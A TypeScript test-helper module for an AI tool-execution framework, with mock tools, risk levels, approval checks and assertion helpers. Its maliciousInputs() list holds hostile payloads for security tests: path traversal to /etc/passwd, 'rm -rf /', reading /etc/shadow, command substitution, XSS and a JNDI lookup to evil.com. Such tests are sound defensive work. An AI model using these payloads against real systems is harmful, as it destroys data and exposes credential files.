/**
 * Tool Test Helpers
 * 
 * Utility functions and fixtures for tool testing,
 * including test tools, contexts, and validation helpers.
 */

import { randomUUID } from 'crypto'
import { z } from 'zod'
import { 
  ToolDescriptor,
  ToolCapability,
  ToolContext,
  BuiltinTool,
  ExecutionScope
} from '@/lib/app/tools/types'
import { globalToolRegistry } from '@/lib/app/tools/registry'

/**
 * Create a test execution context
 */
export function createTestExecutionContext(params: {
  sessionId: string
  userId?: string
  workspaceDir: string
  conversationId?: string
  grantedCapabilities?: ToolCapability[]
}): ToolContext {
  return {
    executionId: randomUUID(),
    sessionId: params.sessionId,
    userId: params.userId,
    workspaceDir: params.workspaceDir,
    grantedCapabilities: params.grantedCapabilities || [
      'filesystem-read',
      'filesystem-write',
      'runtime-query',
      'system-info'
    ],
    startTime: new Date(),
    conversationId: params.conversationId
  }
}

/**
 * Create a test tool descriptor
 */
export function createTestToolDescriptor(params: {
  name: string
  description?: string
  riskLevel?: 'low' | 'medium' | 'high'
  capabilities?: ToolCapability[]
  approvalRequired?: boolean
  executionScope?: Partial<ExecutionScope>
  metadata?: Record<string, unknown>
}): ToolDescriptor {
  const defaultExecutionScope: ExecutionScope = {
    allowedPaths: ['/tmp/**', '/workspace/**'],
    deniedPaths: ['/etc/**', '/sys/**', '/proc/**'],
    networkRules: {
      defaultAllow: false,
      allowedDomains: [],
      allowedPorts: []
    },
    resourceLimits: {
      maxMemoryMB: 512,
      maxCpuPercent: 50,
      maxExecutionTimeSec: 30
    },
    requiredPermissions: params.capabilities || ['filesystem-read']
  }

  return {
    name: params.name,
    description: params.description || `Test tool: ${params.name}`,
    version: '1.0.0',
    author: 'test-suite',
    capabilities: params.capabilities || ['filesystem-read'],
    riskLevel: params.riskLevel || 'low',
    approvalRequired: params.approvalRequired || false,
    executionScope: { ...defaultExecutionScope, ...params.executionScope },
    inputSchema: z.object({
      test: z.string().optional()
    }),
    outputSchema: z.object({
      result: z.string(),
      executionTime: z.number()
    }),
    tags: ['test'],
    metadata: params.metadata
  }
}

/**
 * Create a malicious tool descriptor for security testing
 */
export function createMaliciousToolDescriptor(params: {
  name: string
  description?: string
  riskLevel?: 'low' | 'medium' | 'high'
  capabilities?: ToolCapability[]
  approvalRequired?: boolean
}): ToolDescriptor {
  return createTestToolDescriptor({
    ...params,
    riskLevel: params.riskLevel || 'high',
    capabilities: params.capabilities || ['filesystem-write', 'network-egress', 'process-exec'],
    approvalRequired: params.approvalRequired !== false,
    metadata: {
      malicious: true,
      test: 'security-testing'
    }
  })
}

/**
 * Create a mock built-in tool implementation
 */
export function createMockBuiltinTool(descriptor: ToolDescriptor): BuiltinTool {
  return {
    descriptor,
    execute: async (input: unknown, context: ToolContext) => {
      // Simulate tool execution
      const startTime = Date.now()
      
      // Add some processing delay
      await new Promise(resolve => setTimeout(resolve, Math.random() * 100))
      
      const executionTime = Date.now() - startTime
      
      // Mock different tool behaviors based on name
      switch (descriptor.name) {
        case 'list-models':
          return {
            models: [
              { name: 'llama2', size: '7B', status: 'loaded' },
              { name: 'mistral', size: '7B', status: 'available' },
              { name: 'codellama', size: '13B', status: 'available' }
            ],
            executionTime
          }
          
        case 'read-file':
          const filePath = (input as any)?.path || '/tmp/default.txt'
          if (filePath.includes('non/existent')) {
            throw new Error('File not found')
          }
          return {
            content: `Mock content for ${filePath}`,
            size: 1024,
            executionTime
          }
          
        case 'get-metrics':
          return {
            cpu: 45.2,
            memory: 67.8,
            disk: 23.1,
            network: 12.4,
            timestamp: new Date().toISOString(),
            executionTime
          }
          
        case 'query-settings':
          return {
            settings: {
              theme: 'dark',
              language: 'en',
              timezone: 'UTC'
            },
            executionTime
          }
          
        case 'index-file':
          return {
            indexed: true,
            documentId: randomUUID(),
            chunks: 5,
            executionTime
          }
          
        case 'summarize-file':
          return {
            summary: `Mock summary of content: ${(input as any)?.content || 'empty'}`,
            wordCount: 42,
            executionTime
          }
          
        default:
          return {
            result: `Mock execution of ${descriptor.name}`,
            input,
            context: context.executionId,
            executionTime
          }
      }
    },
    validate: (input: unknown) => {
      // Basic validation
      try {
        descriptor.inputSchema.parse(input)
        return { valid: true, errors: [], warnings: [] }
      } catch (error) {
        return {
          valid: false,
          errors: error instanceof Error ? [error.message] : ['Validation failed'],
          warnings: []
        }
      }
    }
  }
}

/**
 * Register all built-in tools for testing
 */
export async function registerBuiltinTools(): Promise<void> {
  const builtinTools = [
    // Low-risk tools
    createTestToolDescriptor({
      name: 'list-models',
      description: 'List available AI models',
      riskLevel: 'low',
      capabilities: ['runtime-query'],
      approvalRequired: false
    }),
    
    createTestToolDescriptor({
      name: 'read-file',
      description: 'Read file contents',
      riskLevel: 'low',
      capabilities: ['filesystem-read'],
      approvalRequired: false,
      inputSchema: z.object({
        path: z.string().min(1)
      })
    }),
    
    createTestToolDescriptor({
      name: 'get-metrics',
      description: 'Get system metrics',
      riskLevel: 'low',
      capabilities: ['system-info'],
      approvalRequired: false
    }),
    
    createTestToolDescriptor({
      name: 'query-settings',
      description: 'Query application settings',
      riskLevel: 'low',
      capabilities: ['database-read'],
      approvalRequired: false
    }),
    
    // Medium-risk tools
    createTestToolDescriptor({
      name: 'index-file',
      description: 'Index file for search',
      riskLevel: 'medium',
      capabilities: ['filesystem-write'],
      approvalRequired: true,
      inputSchema: z.object({
        path: z.string().min(1),
        content: z.string()
      })
    }),
    
    createTestToolDescriptor({
      name: 'summarize-file',
      description: 'Summarize file content',
      riskLevel: 'medium',
      capabilities: ['filesystem-read'],
      approvalRequired: true,
      inputSchema: z.object({
        path: z.string().min(1),
        content: z.string(),
        model: z.string().optional()
      })
    })
  ]

  // Register all tools
  for (const toolDescriptor of builtinTools) {
    try {
      await globalToolRegistry.register(toolDescriptor)
    } catch (error) {
      // Tool might already be registered, which is fine for tests
      console.debug(`Tool ${toolDescriptor.name} registration:`, error)
    }
  }
}

/**
 * Create test approval request
 */
export function createTestApprovalRequest(params: {
  toolName: string
  sessionId: string
  userId?: string
  input?: unknown
}): {
  id: string
  tool: ToolDescriptor
  context: ToolContext
  inputSanitized: unknown
  riskAssessment: {
    level: 'low' | 'medium' | 'high'
    score: number
    reasons: string[]
    potentialImpact: string[]
  }
  requestedAt: Date
  expiresAt: Date
  sessionId: string
  userId?: string
} {
  const toolDescriptor = createTestToolDescriptor({
    name: params.toolName,
    riskLevel: 'medium'
  })

  const context = createTestExecutionContext({
    sessionId: params.sessionId,
    userId: params.userId,
    workspaceDir: '/tmp/test'
  })

  return {
    id: randomUUID(),
    tool: toolDescriptor,
    context,
    inputSanitized: params.input || {},
    riskAssessment: {
      level: 'medium',
      score: 50,
      reasons: ['Test risk assessment'],
      potentialImpact: ['Test impact']
    },
    requestedAt: new Date(),
    expiresAt: new Date(Date.now() + 30 * 60 * 1000), // 30 minutes
    sessionId: params.sessionId,
    userId: params.userId
  }
}

/**
 * Wait for async operations with timeout
 */
export function waitForAsync<T>(
  operation: () => Promise<T>,
  timeoutMs: number = 5000
): Promise<T> {
  return Promise.race([
    operation(),
    new Promise<never>((_, reject) => 
      setTimeout(() => reject(new Error('Operation timed out')), timeoutMs)
    )
  ])
}

/**
 * Generate random test data
 */
export const TestDataGenerator = {
  /**
   * Generate random string
   */
  randomString(length: number = 10): string {
    return Math.random().toString(36).substring(2, 2 + length)
  },

  /**
   * Generate random file path
   */
  randomFilePath(): string {
    const dirs = ['tmp', 'workspace', 'data', 'logs']
    const files = ['test.txt', 'data.json', 'config.yaml', 'output.log']
    const dir = dirs[Math.floor(Math.random() * dirs.length)]
    const file = files[Math.floor(Math.random() * files.length)]
    return `/${dir}/${this.randomString()}-${file}`
  },

  /**
   * Generate random tool input
   */
  randomToolInput(): Record<string, unknown> {
    return {
      test: this.randomString(),
      number: Math.floor(Math.random() * 1000),
      boolean: Math.random() > 0.5,
      array: Array.from({ length: Math.floor(Math.random() * 5) }, () => this.randomString()),
      nested: {
        deep: {
          value: this.randomString()
        }
      }
    }
  },

  /**
   * Generate malicious input patterns
   */
  maliciousInputs(): string[] {
    return [
      '../../../etc/passwd',
      '; rm -rf /',
      '&& cat /etc/shadow',
      '$(cat /etc/passwd)',
      '`whoami`',
      '<script>alert("xss")</script>',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ]
  }
}

/**
 * Test assertion helpers
 */
export const TestAssertions = {
  /**
   * Assert tool execution result is successful
   */
  assertSuccess(result: any, message?: string) {
    expect(result.success, message || 'Expected tool execution to succeed').toBe(true)
    expect(result.output, message || 'Expected tool to have output').toBeDefined()
    expect(result.metrics.executionTimeMs, message || 'Expected execution time to be recorded').toBeGreaterThan(0)
  },

  /**
   * Assert tool execution result failed with specific error
   */
  assertFailure(result: any, expectedErrorCode?: string, message?: string) {
    expect(result.success, message || 'Expected tool execution to fail').toBe(false)
    expect(result.error, message || 'Expected error information').toBeDefined()
    
    if (expectedErrorCode) {
      expect(result.error.code, message || `Expected error code ${expectedErrorCode}`).toBe(expectedErrorCode)
    }
  },

  /**
   * Assert approval is required
   */
  assertApprovalRequired(result: any, message?: string) {
    expect(result.success, message || 'Expected execution to fail due to approval requirement').toBe(false)
    expect(result.error?.code, message || 'Expected APPROVAL_REQUIRED error').toBe('APPROVAL_REQUIRED')
    expect(result.approval.required, message || 'Expected approval to be required').toBe(true)
    expect(result.approval.granted, message || 'Expected approval not to be granted').toBe(false)
  },

  /**
   * Assert risk assessment is reasonable
   */
  assertRiskAssessment(riskAssessment: any, expectedLevel?: 'low' | 'medium' | 'high', message?: string) {
    expect(riskAssessment, message || 'Expected risk assessment to exist').toBeDefined()
    expect(riskAssessment.level, message || 'Expected risk level to be valid').toMatch(/^(low|medium|high)$/)
    expect(riskAssessment.score, message || 'Expected risk score to be between 0-100').toBeGreaterThanOrEqual(0)
    expect(riskAssessment.score, message || 'Expected risk score to be between 0-100').toBeLessThanOrEqual(100)
    expect(riskAssessment.reasons, message || 'Expected risk reasons to be array').toBeInstanceOf(Array)
    expect(riskAssessment.recommendations, message || 'Expected risk recommendations to be array').toBeInstanceOf(Array)
    
    if (expectedLevel) {
      expect(riskAssessment.level, message || `Expected risk level ${expectedLevel}`).toBe(expectedLevel)
    }
  }
}

/**
 * Mock validation utilities
 */
export const MockValidation = {
  /**
   * Create a mock validation result
   */
  createResult(valid: boolean, errors: string[] = [], warnings: string[] = []) {
    return { valid, errors, warnings }
  },

  /**
   * Create a successful validation result
   */
  success(warnings: string[] = []) {
    return this.createResult(true, [], warnings)
  },

  /**
   * Create a failed validation result
   */
  failure(errors: string[], warnings: string[] = []) {
    return this.createResult(false, errors, warnings)
  }
}
